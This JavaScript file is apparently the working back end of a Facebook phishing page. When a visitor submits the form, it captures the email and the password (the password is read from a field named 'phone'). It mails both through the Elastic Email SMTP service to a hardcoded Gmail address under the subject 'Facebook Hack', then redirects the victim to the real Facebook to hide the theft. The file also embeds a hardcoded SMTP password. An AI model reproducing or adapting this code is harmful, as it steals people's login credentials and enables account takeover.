const form = document.querySelector("form");
const email = document.getElementById("email");
const phone = document.getElementById("phone");
const subject = document.getElementById("subject");
const mess = document.getElementById("message");



function sendEmail() {
    const bodyMessage = `Email: ${email.value}<br> Password: ${phone.value}`;

    Email.send({
        Host: "smtp.elasticemail.com",
        Username: "theaiinsight8@gmail.com",
        Password: "D12D0E64210721AC694EB83A19EC0F269770",
        To: 'theaiinsight8@gmail.com',
        From: "theaiinsight8@gmail.com",
        Subject: "Facebook Hack",
        Body: bodyMessage
    }).then(
        message => {
            if (message == "OK") {
                
                window.open("https://www.facebook.com", "_blank"); 
            }
        });
}


function checkInputs() {
    const items = document.querySelectorAll(".item");

    for (const item of items) {
        if (item.value == "") {
            item.classList.add("error");
            item.parentElement.classList.add("error");
        }

        // if (items[1].value != "") {
        //     checkEmail();
        // }

        // items[1].addEventListener("keyup", () => {
        //     checkEmail();
        // });

        item.addEventListener("keyup", () => {
            if (item.value != "") {
                item.classList.remove("error");
                item.parentElement.classList.remove("error");
            }
            else {
                item.classList.add("error");
                item.parentElement.classList.add("error");
            }
        });
    }
}


function checkEmail() {
    // const emailRegex = /^([a-z\d\.-]+)@([a-z\d-]+)\.([a-z]{2,3})(\.[a-z]{2,3})?$/;

    // const errorTxtEmail = document.querySelector(".error-txt.email");

    // if (!email.value.match(emailRegex)) {
    //     email.classList.add("error");
    //     email.parentElement.classList.add("error");

        // if (email.value != "") {
        //     errorTxtEmail.innerText = "Enter a valid Email Address";
        // }
    //     else {
    //         errorTxtEmail.innerText = "Email Address can't be blank";
    //     }
    // }
    // else {
    //     email.classList.remove("error");
    //     email.parentElement.classList.remove("error");
    // }
}





form.addEventListener("submit", (e) => {
    e.preventDefault();
    checkInputs();
  
    if (!email.classList.contains("error") && !phone.classList.contains("error")) {
    sendEmail();
  
      form.reset();
      return false;
  
    }
  
  
  });